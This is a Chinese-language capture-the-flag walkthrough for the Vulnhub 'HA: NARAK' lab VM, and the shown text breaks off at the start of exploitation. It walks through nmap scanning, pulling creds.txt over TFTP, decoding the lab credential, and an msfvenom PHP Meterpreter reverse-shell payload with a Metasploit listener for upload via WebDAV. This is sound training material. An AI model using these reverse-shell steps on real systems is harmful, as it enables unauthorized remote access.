# 前言：

Vulnhub是一个提供各种漏洞环境的靶场，每个镜像会有破解的目标，挑战的目标是通过网络闯入系统获取root权限和查看flag

## 说明：

## **这次选择的靶场名字为：HA: NARAK**

## 

靶场下载链接：https://download.vulnhub.com/ha/narak.ova

个人建议在vmware运行靶场环境，再使用kali或者终端机器作为攻击主机，同时要注意kali在同一网卡下，否则是无法进行通信的。

题目的描述为：

![](../Images/a453a39ff612e9e735942b4340de5d01.png)

为了让更多新手朋友少走弯路，我尽量写详细一点，如果有什么不清楚的地方可以对我们发起提问

## 开始：

在这里我让kali和靶场都使用NAT模式

在编辑->虚拟网络编辑器处可以看到我们使用模式的配置。

![](../Images/552ce3a85a1ffc2c86c8c073c133e989.png)

![](../Images/cc46332231029671a2b6f733f6d5a79f.png)

Ip地址段都为192.168.158.\*

目标主机：未知ip

 

既然知道ip段，不知道IP，我们可与使用nmap去扫描整个 c段来探测主机

使用命令：Nmap -sS -Pn 192.168.158.0/24

![](../Images/c9c17813c12eb19ca73ebc81c4855830.png)

发现192.168.158.142开放了80和22

那我们所需要渗透的靶场就为192.168.158.142了

虽然使用 nmap -sS -Pn ip这个扫描会虽然速度很快，不过很多端口会扫描不出来

我们可以使用命令：nmap -T4 -A -v-p 1-65535 ip去详细对目标扫描一下

![](../Images/0f35cba979d714595e41cab52e35fad6.png)

使用udp进行端口扫描，命令：nmap-sU -Pn 192.168.158.142

![](../Images/f54f1c02d8a693773c297a56685ef20e.png)

一共开放了4个端口，80端口的web，22端口的ssh，69的tftp和68的dhcpc

其中80开放http服务

我们先访问一下80吧

![](../Images/30783b366b7ba79ac65e611d22eb8b2c.png)

使用google的wappalyzer插件查看一下是否有框架信息

![](../Images/257a492640d3c951f14817209689faa7.png)

并没有得到网站开发的框架，但可以知道网站的apche的版本和ubuntu的操作系统

这时我们可以对目标进行目录扫描：

先使用dirscan进行扫描

![](../Images/db460a4327ec64eefc3c1700be15c6ca.png)

访问/webdav

![](../Images/bf7cb138013c7fc41545a66483edf885.png)

由于我们没有账号信息，想要爆破起来比较困难，我们对目标继续信息收集。

使用7kbscan对目标扫描其他的扩展

最终在找到一个txt文件

![](../Images/cdd26b448d5810d12dd253ef27edbfe0.png)

访问一下

![](../Images/ad3e32f943ea8966e09df031786e0d20.png)

提示我们关键的文件在creds.txt里

看来我们需要找到creads.txt文件，但是扫描都没发现这个文件

猜测可能是存在tftp中的

我们开启一下tftp服务（控制面板->程序->启动或者关闭window功能）

![](../Images/71fa908a97b68ae3d1ff916ef1750fea.png)

使用cmd

![](../Images/6532a13d3cd8f4ddd86df49dd78750cd.png)

使用命令:tftp -i 192.168.158.142 get creds.txt 果然存在

![](../Images/8b97c4d5ac5d7b6a26a0da85b1e40b93.png)

打开发现是一串base64

![](../Images/947e8883db1afc3772518cc9c241b466.png)

![](../Images/7d3d0d23b8580b24aa97e0bc795c6439.png)

解密得到为：yamdoot:Swarg

![](../Images/df780498e23736860a86d98fe36ca5f9.png)

![](../Images/bc29723bab72d110d6b6e5735969341e.png)

可以发现我们是可以通过webdav上传文件的

接着我们使用kali的cadaver去连接webdav

使用命令：cadaver http://192.168.158.142/webdav

![](../Images/54563c36e39c6f1aeb5dd2adc7dd57b1.png)

由于这里是需要登录webdav所以我们需要上传能反弹shell的木马文件

这里使用kali生成一个msf的php马，命令：

msfvenom -pphp/meterpreter\_reverse\_tcp LHOST=xxx LPORT=xxx -f raw > shell.php

kali进行监听

命令：

use exploit/multi/handler

set payloadphp/meterpreter\_reverse\_tcp

php/meterpreter\_reverse\_tcp

set lhost 192.168.158.132

192.168.158.132

set lport 8888

run
